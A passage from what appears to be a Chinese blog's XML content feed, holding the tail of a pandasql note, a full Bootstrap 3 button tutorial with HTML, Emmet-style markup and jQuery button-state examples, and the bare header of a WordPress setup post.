class="line">##### pandasql:使用SLQ方式打开Pandas</span><br><span class="line">使用SQL语句对DataFrame操作</span><br><span class="line">两个参数：SQL查询语句，环境变量( globals()或locals() )</span><br><span class="line"></span><br></pre></td></tr></table></figure>  import pandas as pd<br>  from pandas import DataFrame<br>  from pandasql import sqldf, load_meat, load_births<br>  df1 = DataFrame({‘name’:[‘ZhangFei’, ‘GuanYu’, ‘a’, ‘b’, ‘c’], ‘data1’:range(5)})<br>  pysqldf = lambda sql: sqldf(sql, globals())<br>  sql = “select * from df1 where name =’ZhangFei’”<br>  print pysqldf(sql)<br>  ```</li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> 数据分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3, Bootstrap 按钮</title>
      <link href="/categories/%E5%89%8D%E7%AB%AF/Bootstrap%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/3-bootstrap-%E6%8C%89%E9%92%AE/"/>
      <url>/categories/%E5%89%8D%E7%AB%AF/Bootstrap%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0/3-bootstrap-%E6%8C%89%E9%92%AE/</url>
      
        <content type="html"><![CDATA[<h4 id="按钮"><a href="#按钮" class="headerlink" title="按钮"></a>按钮</h4><h5 id="按钮样式"><a href="#按钮样式" class="headerlink" title="按钮样式"></a>按钮样式</h5><table><thead><tr><th>类</th><th>背景颜色</th><th>描述</th></tr></thead><tbody><tr><td>btn btn-default</td><td>白色</td><td>带渐变的默认灰色按钮。</td></tr><tr><td>btn btn-primary</td><td>深蓝色</td><td>在一组按钮中的主动作按钮。</td></tr><tr><td>btn btn-success</td><td>绿色</td><td>替代默认按钮。</td></tr><tr><td>btn btn-info</td><td>浅蓝色</td><td>成功或正确的行动。</td></tr><tr><td>btn btn-warning</td><td>橙色</td><td>表明此操作应注意。</td></tr><tr><td>btn btn-danger</td><td>红色</td><td>表示危险或潜在的负面行为。</td></tr><tr><td>btn btn-link</td><td></td><td>使按钮看起来像一个链接。</td></tr></tbody></table><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0qtwty4lvj30ea01hjr9.jpg" alt="效果">button、input、a 标签可用<span id="more"></span><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;button <span class="keyword">type</span>=&quot;button&quot; <span class="keyword">class</span>=&quot;btn btn-default&quot;&gt;<span class="keyword">Default</span>&lt;/button&gt;</span><br><span class="line">&lt;<span class="keyword">input</span> <span class="keyword">type</span>=&quot;button&quot; <span class="keyword">class</span>=&quot;btn btn-default&quot;&gt;<span class="keyword">Default</span>&lt;/<span class="keyword">input</span>&gt;</span><br><span class="line">&lt;a href=&quot;#&quot; <span class="keyword">class</span>=&quot;btn btn-default&quot;&gt;<span class="keyword">Default</span>&lt;/a&gt;</span><br></pre></td></tr></table></figure>##### 按钮尺寸btn-lg 、 btn-sm 、btn-xs<h5 id="按钮-辅助类"><a href="#按钮-辅助类" class="headerlink" title="按钮 辅助类"></a>按钮 辅助类</h5><ul><li>btn-block将使按钮跨越整个网格</li><li>active将使按钮看起来像它当前点击</li><li>disabled将使按钮无法单击并显示渐变色。(btn,input 有<code>disabled=&quot;disabled&quot; </code>)</li></ul><h5 id="按钮的活动状态"><a href="#按钮的活动状态" class="headerlink" title="按钮的活动状态"></a>按钮的活动状态</h5><p>类 <code>active  disabled</code>  </br><br>属性  <code>data-toggle=&quot;button&quot; </code> 状态切换</p><h5 id="全宽按钮"><a href="#全宽按钮" class="headerlink" title="全宽按钮"></a>全宽按钮</h5><p>块级别的按钮：<code>btn-block</code></p><p>按钮 加载中 </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bootstrap.min.css</span><br><span class="line">bootstrap-theme.min.css</span><br><span class="line">jquery.min.js</span><br><span class="line">bootstrap.min.js</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">$(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">  $(<span class="string">&quot;.btn&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    $(<span class="built_in">this</span>).button(<span class="string">&quot;loading&quot;</span>).delay(<span class="number">1000</span>).queue(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="built_in">this</span>).button(<span class="string">&quot;reset&quot;</span>);</span></span><br><span class="line"><span class="javascript">        $(<span class="built_in">this</span>).dequeue();</span></span><br><span class="line"><span class="javascript">    &#125;);  </span></span><br><span class="line"><span class="javascript">  &#125;);</span></span><br><span class="line"><span class="javascript">&#125;);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-danger&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">data-loading-text</span>=<span class="string">&quot;loading...&quot;</span>&gt;</span>Danger<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">data-loading-text</span>=<span class="string">&quot;loading...&quot;</span>&gt;</span>Success<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="按钮下拉菜单"><a href="#按钮下拉菜单" class="headerlink" title="按钮下拉菜单"></a>按钮下拉菜单</h4><h5 id="按钮下拉菜单-1"><a href="#按钮下拉菜单-1" class="headerlink" title="按钮下拉菜单"></a>按钮下拉菜单</h5><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0ryeuoxv4j30dy01b742.jpg" alt="img"><img src="//tva3.sinaimg.cn/large/005zbIM7gy1g0ryfwd1x3j30dy04fwee.jpg" alt="img"><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">bootstrap<span class="selector-class">.min</span><span class="selector-class">.css</span></span><br><span class="line">bootstrap-theme<span class="selector-class">.min</span><span class="selector-class">.css</span></span><br><span class="line">jquery<span class="selector-class">.min</span><span class="selector-class">.js</span></span><br><span class="line">bootstrap<span class="selector-class">.min</span><span class="selector-class">.js</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.row</span></span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.col-xs-6</span></span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.input-group</span></span><br><span class="line">            <span class="selector-tag">div</span><span class="selector-class">.input-group-button</span></span><br><span class="line">                <span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-default</span><span class="selector-class">.dropdown-toggle</span><span class="selector-attr">[type=button]</span><span class="selector-attr">[data-toggle]</span>=<span class="string">&quot;dropdown&quot;</span></span><br><span class="line">                    Action</span><br><span class="line">                    <span class="selector-tag">span</span><span class="selector-class">.caret</span></span><br><span class="line">                <span class="selector-tag">ul</span><span class="selector-class">.dropdown-menu</span>(.pull-<span class="attribute">right</span>)</span><br><span class="line">                    <span class="selector-tag">li</span>  <span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;Action&#125;</span><br><span class="line">                    <span class="selector-tag">li</span><span class="selector-class">.divider</span></span><br><span class="line">                    <span class="selector-tag">li</span>  <span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;Another action&#125;</span><br><span class="line">            <span class="selector-tag">input</span><span class="selector-class">.form-control</span><span class="selector-attr">[type=text]</span></span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.col-xs-6</span></span><br><span class="line">        ...</span><br><span class="line">            ...</span><br><span class="line">                ...</span><br></pre></td></tr></table></figure><h5 id="分段下拉按钮组"><a href="#分段下拉按钮组" class="headerlink" title="分段下拉按钮组"></a>分段下拉按钮组</h5><img src="//tva3.sinaimg.cn/large/005zbIM7gy1g0ryhe2u7rj30e101amwy.jpg" alt="img"><img src="//tva3.sinaimg.cn/large/005zbIM7gy1g0ryinaippj30e404eglj.jpg" alt="img"><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bootstrap<span class="selector-class">.min</span><span class="selector-class">.css</span></span><br><span class="line">bootstrap-theme<span class="selector-class">.min</span><span class="selector-class">.css</span></span><br><span class="line">jquery<span class="selector-class">.min</span><span class="selector-class">.js</span></span><br><span class="line">bootstrap<span class="selector-class">.min</span><span class="selector-class">.js</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.input-group</span></span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.input-group-btn</span></span><br><span class="line">        <span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-default</span><span class="selector-attr">[type=button]</span><span class="selector-attr">[tabindex=-1]</span>&#123;Action&#125;</span><br><span class="line">        <span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-default</span><span class="selector-class">.dropdown-toggle</span><span class="selector-attr">[type=button]</span><span class="selector-attr">[tabindex=-1]</span><span class="selector-attr">[data-toggle=dropdown]</span></span><br><span class="line">            <span class="selector-tag">span</span><span class="selector-class">.caret</span></span><br><span class="line">            <span class="selector-tag">span</span>.sr-only&#123;Toggle Dropdown&#125;</span><br><span class="line">        <span class="selector-tag">ul</span><span class="selector-class">.dropdown-menu</span></span><br><span class="line">            <span class="selector-tag">li</span>  <span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;Action&#125;</span><br><span class="line">            <span class="selector-tag">li</span><span class="selector-class">.divider</span></span><br><span class="line">            <span class="selector-tag">li</span>  <span class="selector-tag">a</span><span class="selector-attr">[href=#]</span>&#123;Separated link&#125;</span><br><span class="line">    <span class="selector-tag">input</span><span class="selector-class">.form-control</span><span class="selector-attr">[type=text]</span></span><br></pre></td></tr></table></figure><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tabindex=<span class="string">&quot;-1&quot;</span>   tabindex属性设为负值，那么标签将被排除在TAB键的序列之外。</span><br><span class="line">.sr-only&#123;you can<span class="symbol">&#x27;t</span> see&#125;   只在屏幕阅读器上显示(帮助残障人士)</span><br></pre></td></tr></table></figure><h4 id="按钮组"><a href="#按钮组" class="headerlink" title="按钮组"></a>按钮组</h4><p><a href="https://www.w3cschool.cn/bootstrap/html-css-bootstrap-button-group.html">按钮组-实现链接</a></p><h5 id="水平按钮组"><a href="#水平按钮组" class="headerlink" title="水平按钮组"></a>水平按钮组</h5><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0rzwklwxkj305901awe9.jpg" alt="img"><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bootstrap<span class="selector-class">.min</span><span class="selector-class">.css</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.btn-group</span></span><br><span class="line">    <span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-primary</span><span class="selector-attr">[type=button]</span>&#123;Left&#125;</span><br><span class="line">    <span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-primary</span><span class="selector-attr">[type=button]</span>&#123;Middle&#125;</span><br><span class="line">    <span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-primary</span><span class="selector-attr">[type=button]</span>&#123;Right&#125;</span><br></pre></td></tr></table></figure><h5 id="垂直按钮组"><a href="#垂直按钮组" class="headerlink" title="垂直按钮组"></a>垂直按钮组</h5><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0rzxk66e0j302o03c742.jpg" alt="img"><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bootstrap<span class="selector-class">.min</span><span class="selector-class">.css</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.btn-group-vertical</span></span><br><span class="line">    <span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-primary</span><span class="selector-attr">[type=button]</span>&#123;Top&#125;</span><br><span class="line">    <span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-primary</span><span class="selector-attr">[type=button]</span>&#123;Middle&#125;</span><br><span class="line">    <span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-primary</span><span class="selector-attr">[type=button]</span>&#123;Bottom&#125;</span><br></pre></td></tr></table></figure>##### 按钮工具栏<img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0rzyq2vstj308801i3ya.jpg" alt="img"><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bootstrap<span class="selector-class">.min</span><span class="selector-class">.css</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.btn-toolbar</span></span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.btn-group</span></span><br><span class="line">        <span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-primary</span><span class="selector-attr">[type=button]</span>&#123;<span class="number">1</span>-<span class="number">4</span>&#125; * <span class="number">4</span></span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.btn-group</span></span><br><span class="line">        <span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-primary</span><span class="selector-attr">[type=button]</span>&#123;<span class="number">5</span>-<span class="number">7</span>&#125; * <span class="number">3</span></span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.btn-group</span></span><br><span class="line">        <span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-primary</span><span class="selector-attr">[type=button]</span>&#123;<span class="number">8</span>&#125;</span><br></pre></td></tr></table></figure><h5 id="按钮组的高度"><a href="#按钮组的高度" class="headerlink" title="按钮组的高度"></a>按钮组的高度</h5><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0rzzejdelj306z05r3yf.jpg" alt="img"><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bootstrap<span class="selector-class">.min</span><span class="selector-class">.css</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.btn-toolbar</span></span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.btn-group</span><span class="selector-class">.btn-group-lg</span></span><br><span class="line">        <span class="selector-tag">button</span><span class="selector-class">.btn</span>.btn-primary&#123;Left&#125;</span><br><span class="line">        <span class="selector-tag">button</span><span class="selector-class">.btn</span>.btn-primary&#123;Middle&#125;</span><br><span class="line">        <span class="selector-tag">button</span><span class="selector-class">.btn</span>.btn-primary&#123;Right&#125;</span><br><span class="line">    br</span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.btn-toolbar</span></span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.btn-group</span></span><br><span class="line">        button*<span class="number">3</span></span><br><span class="line">    br</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.btn-group</span><span class="selector-class">.btn-group-sm</span></span><br><span class="line">        button*<span class="number">3</span></span><br><span class="line">    br</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.btn-group</span><span class="selector-class">.btn</span><span class="selector-class">.group-xs</span></span><br><span class="line">        button*<span class="number">3</span></span><br><span class="line">----------</span><br><span class="line">没有 btn-toolbar           按钮组上下会没有间隙</span><br><span class="line">没有 btn-group,只有btn-group-lg  按钮左右有间隙</span><br></pre></td></tr></table></figure>##### 在组中对齐按钮(按钮伸展以跨越其父类的整个宽度)<img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0s00nyo69j30t601lwea.jpg" alt="img"><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bootstrap<span class="selector-class">.min</span><span class="selector-class">.css</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.btn-group</span><span class="selector-class">.btn-group-justified</span></span><br><span class="line">    <span class="selector-tag">a</span><span class="selector-class">.btn</span><span class="selector-class">.btn-primary</span><span class="selector-attr">[href=#]</span>&#123;<span class="attribute">Left</span>&#125;</span><br><span class="line">    <span class="selector-tag">a</span><span class="selector-class">.btn</span><span class="selector-class">.btn-primary</span><span class="selector-attr">[href=#]</span>&#123;Middle&#125;</span><br><span class="line">    <span class="selector-tag">a</span><span class="selector-class">.btn</span><span class="selector-class">.btn-primary</span><span class="selector-attr">[href=#]</span>&#123;<span class="attribute">Right</span>&#125;</span><br><span class="line">    </span><br><span class="line"># <span class="selector-tag">button</span> 需要单独封装在类 <span class="selector-tag">div</span><span class="selector-class">.btn-group</span> </span><br><span class="line"><span class="selector-tag">div</span><span class="selector-class">.btn-group</span><span class="selector-class">.btn-group-justified</span></span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.btn-group</span></span><br><span class="line">        <span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-primary</span><span class="selector-attr">[type=button]</span>&#123;<span class="attribute">Left</span>&#125;</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.btn-group</span></span><br><span class="line">        <span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-primary</span><span class="selector-attr">[type=button]</span>&#123;Middle&#125;</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.btn-group</span></span><br><span class="line">        <span class="selector-tag">button</span><span class="selector-class">.btn</span><span class="selector-class">.btn-primary</span><span class="selector-attr">[type=button]</span>&#123;<span class="attribute">Right</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="按钮方法"><a href="#按钮方法" class="headerlink" title="按钮方法"></a>按钮方法</h4><h5 id="通过JS-loading"><a href="#通过JS-loading" class="headerlink" title="通过JS-loading"></a>通过JS-loading</h5><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0t5o3dr1xj30dt037dfu.jpg" alt="img"><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0t5y4tg6ij308x02s748.jpg" alt="img"></br>　　　　　　　　<b>点击时loading</b><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">js css</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">script</span>&gt;</span><br><span class="line">$(document).ready(function()&#123;</span><br><span class="line">   $(<span class="string">&quot;.nav-tabs a&quot;</span>).click(function()&#123;</span><br><span class="line">      $(this).button(<span class="string">&quot;loading&quot;</span>).<span class="built_in">delay</span>(<span class="number">500</span>).queue(function()&#123;</span><br><span class="line">          $(this).button(&#x27;reset&#x27;);</span><br><span class="line">          $(this).dequeue();</span><br><span class="line">      &#125;) ;</span><br><span class="line">   &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/<span class="keyword">script</span>&gt;</span><br><span class="line"></span><br><span class="line">css .nav a&#123;outline: none;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">div</span>.bs-example</span><br><span class="line">    <span class="keyword">div</span>.tabbable</span><br><span class="line">        ul.nav.nav-tabs</span><br><span class="line">            li.active</span><br><span class="line">               a[data-toggle=<span class="literal">tab</span>][href=<span class="comment">#tab1][data-loading-text=Loading...]&#123;Section 1&#125;</span></span><br><span class="line">            li</span><br><span class="line">               a[data-toggle=<span class="literal">tab</span>][href=<span class="comment">#tab2][data-loading-text=Loading...]&#123;Section 2&#125;</span></span><br><span class="line">            li</span><br><span class="line">               a[data-toggle=<span class="literal">tab</span>][href=<span class="comment">#tab3][data-loading-text=Loading...]&#123;Section 3&#125;</span></span><br><span class="line">        <span class="keyword">div</span>.<span class="literal">tab</span>-content</span><br><span class="line">            <span class="keyword">div</span><span class="comment">#tab1.tab-pane.active.fade.in</span></span><br><span class="line">                p&#123;Some Words&#125;</span><br><span class="line">            <span class="keyword">div</span><span class="comment">#tab2.tab-pane.fade</span></span><br><span class="line">                p&#123;Some Words&#125;</span><br><span class="line">            <span class="keyword">div</span><span class="comment">#tab3.tab-pane.fade</span></span><br><span class="line">                p&#123;Some Words&#125;</span><br></pre></td></tr></table></figure><h5 id="button-‘toggle’-点击切换状态"><a href="#button-‘toggle’-点击切换状态" class="headerlink" title="().button(‘toggle’)　　点击切换状态"></a>().button(‘toggle’)　　点击切换状态</h5><p><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0t65kj659j30cn01cwei.jpg" alt="img"></br><br><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0t66q5dj4j301x01da9t.jpg" alt="img"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    $(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">&quot;#myButtons .btn&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">           $(<span class="built_in">this</span>).button(<span class="string">&quot;toggle&quot;</span>); </span></span><br><span class="line"><span class="javascript">        &#125;);</span></span><br><span class="line"><span class="javascript">    &#125;);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">div#myButtons.bs-example</span><br><span class="line">    button.btn.btn-default&#123;Default&#125;</span><br><span class="line">    ..</span><br><span class="line">    ..</span><br></pre></td></tr></table></figure><h5 id="button-‘string’"><a href="#button-‘string’" class="headerlink" title="().button(‘string’)"></a>().button(‘string’)</h5><ul><li>().button(‘loading’)  [data-loading-text=””]   加载时，”Laoding…”, 按钮将被禁用</li><li>().button(‘reset’)  重置</li><li>().button(‘complete’)   [data-complete-text=””]    完成    <img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0u0k6xgj0j30d501emx6.jpg" alt="img"><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    $(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">&quot;#myButtons .btn&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            $(<span class="built_in">this</span>).button(<span class="string">&#x27;loading&#x27;</span>).delay(<span class="number">1000</span>).queue(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                $(<span class="built_in">this</span>).button(<span class="string">&#x27;reset&#x27;</span>);</span></span><br><span class="line"><span class="javascript">                <span class="comment">//$(this).button(&#x27;complete&#x27;);   Loading...不重置，一直在</span></span></span><br><span class="line"><span class="javascript">                $(<span class="built_in">this</span>).dequeue();</span></span><br><span class="line"><span class="javascript">            &#125;);</span></span><br><span class="line"><span class="javascript">        &#125;);</span></span><br><span class="line"><span class="javascript">    &#125;);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">div#myButtons.bs-example</span><br><span class="line">    form[action=#][autocomplete=off]</span><br><span class="line">        button.btn.btndefault[type=button]&#123;Default&#125;</span><br><span class="line">        //button(&#x27;complete&#x27;) 时需要加属性</span><br><span class="line">        // [data-complete-text=Loading Completed]</span><br><span class="line">        ...</span><br><span class="line">        ....</span><br><span class="line">------------------------</span><br><span class="line">autocomplete = on  存储填写记录，帮助填写表单</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Bootstrap教程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Bootstrap </tag>
            
            <tag> W3School </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务器上搭建wordpress</title>
      <link href="/categories/Linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%90%AD%E5%BB%BAwordpress/"/>
      <url>/categories/Linux/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%90%AD%E5%BB%BAwordpress/</url>
      
